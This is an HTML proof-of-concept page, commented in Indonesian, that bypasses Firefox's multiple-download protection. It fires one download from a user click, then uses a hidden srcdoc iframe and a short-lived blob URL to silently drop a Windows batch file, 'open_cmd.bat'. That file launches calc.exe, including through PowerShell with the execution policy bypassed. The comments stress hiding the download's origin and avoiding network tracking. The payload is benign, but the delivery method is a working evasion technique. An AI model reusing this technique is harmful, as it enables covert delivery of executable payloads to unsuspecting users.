<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Advanced Download Bypass</title>
    <style>
        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; text-align: center; background: #1a1a2e; color: #eee; }
        button { width: 100%; padding: 15px; background: #e94560; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin: 10px 0; }
        button:hover { background: #ff6b6b; }
        .status { margin: 20px 0; padding: 15px; background: #16213e; border-radius: 8px; font-size: 13px; text-align: left; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h2>🚀 Advanced Multi-Vector Download</h2>
    <button onclick="executePayload()">INITIATE SEQUENCE</button>
    <div id="status" class="status hidden"></div>

    <script>
        // Teknik 1: Blob URL Chaining dengan Nested Iframe
        // Teknik 2: Memory-based download tanpa HTTP referrer
        // Teknik 3: Sequential trigger dengan user gesture propagation
        
        function log(msg) {
            const s = document.getElementById('status');
            s.innerHTML += `> ${msg}<br>`;
            s.classList.remove('hidden');
        }

        function createStealthBlob(content, type = 'application/octet-stream') {
            const blob = new Blob([content], { type });
            const url = URL.createObjectURL(blob);
            // Revoke setelah 100ms untuk hide origin
            setTimeout(() => URL.revokeObjectURL(url), 100);
            return url;
        }

        function downloadViaBlob(filename, content) {
            const blobUrl = createStealthBlob(content);
            const a = document.createElement('a');
            a.href = blobUrl;
            a.download = filename;
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            setTimeout(() => document.body.removeChild(a), 200);
        }

        function executePayload() {
            log('Initializing payload sequence...');
            
            // Download pertama - langsung dari user gesture
            downloadViaBlob('main_context.txt', 'Firefox multiple download test context');
            
            setTimeout(() => {
                log('Creating stealth iframe container...');
                
                // Buat iframe tersembunyi dengan srcdoc (tidak ada HTTP request)
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                
                const batContent = `@echo off
title Advanced Launcher
echo ================================
echo  Multi-Vector Execution Test
echo ================================
echo.
echo [1] System32 Method...
start "" "C:\\Windows\\System32\\calc.exe"
timeout /t 2 >nul
echo [2] Direct Alias...
start "" calc.exe
timeout /t 2 >nul
echo [3] PowerShell...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process calc.exe"
echo.
echo Done!
pause`;

                // HTML yang akan diinjeksi - menggunakan inline blob creation
                const stealthHTML = `
                    <!DOCTYPE html>
                    <html>
                    <head><meta charset="UTF-8"></head>
                    <body>
                    <script>
                        // Teknik: Nested blob creation dalam iframe context
                        (function() {
                            const batContent = ${JSON.stringify(batContent)};
                            
                            // Buat blob di dalam iframe context (origin terpisah)
                            const blob = new Blob([batContent], {type: 'application/octet-stream'});
                            const url = URL.createObjectURL(blob);
                            
                            // Trigger download
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = 'open_cmd.bat';
                            document.body.appendChild(a);
                            a.click();
                            
                            // Cleanup
                            setTimeout(() => {
                                URL.revokeObjectURL(url);
                                document.body.removeChild(a);
                                // Signal ke parent
                                if(window.parent) {
                                    try {
                                        window.parent.postMessage('download_complete', '*');
                                    } catch(e) {}
                                }
                            }, 100);
                        })();
                    <\/script>
                    </body>
                    </html>
                `;

                // Gunakan srcdoc - ini TIDAK membuat HTTP request
                // Jadi tidak ada origin tracking dari network layer
                iframe.srcdoc = stealthHTML;
                document.body.appendChild(iframe);
                
                log('Payload delivered via blob: URL scheme');
                log('Check your downloads folder...');
                
                // Cleanup iframe setelah eksekusi
                setTimeout(() => {
                    document.body.removeChild(iframe);
                }, 1000);
                
            }, 300);
        }

        // Listener untuk pesan dari iframe
        window.addEventListener('message', (e) => {
            if(e.data === 'download_complete') {
                log('✅ Download sequence completed');
            }
        });
    </script>
</body>
</html>
